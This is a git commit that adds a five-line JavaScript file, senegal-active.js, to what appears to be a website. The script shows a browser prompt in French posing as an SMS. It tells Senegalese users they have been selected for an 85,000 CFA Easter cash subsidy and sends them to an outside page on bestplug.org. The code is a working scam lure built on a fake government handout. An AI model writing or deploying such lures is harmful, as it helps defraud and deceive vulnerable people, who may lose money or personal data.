0f6f9889c5a6bcbbd5f9bab3f3627a6b8e71b76b
vibeblog <enom02567@gmail.com>
2025-04-17 21:29:38 +0100

    Create senegal-active.js

---
+++ senegal-active.js
@@ -0,0 +1,5 @@
+var password = 'RETIRER 85 000 CFA'
+password=prompt('SMS: Félicitations, vous faites partie des Sénégalais sélectionnés pour recevoir 85 000 CFA en guise de subvention en espèces pour la célébration de Pâques. Appuyez sur OK pour retirer maintenant ','RETIRER 85 000 CFA');
+if (password != 'RETIRER 85 000 CFA') {
+location.href='https://bestplug.org/senegal-easter.html';
+}
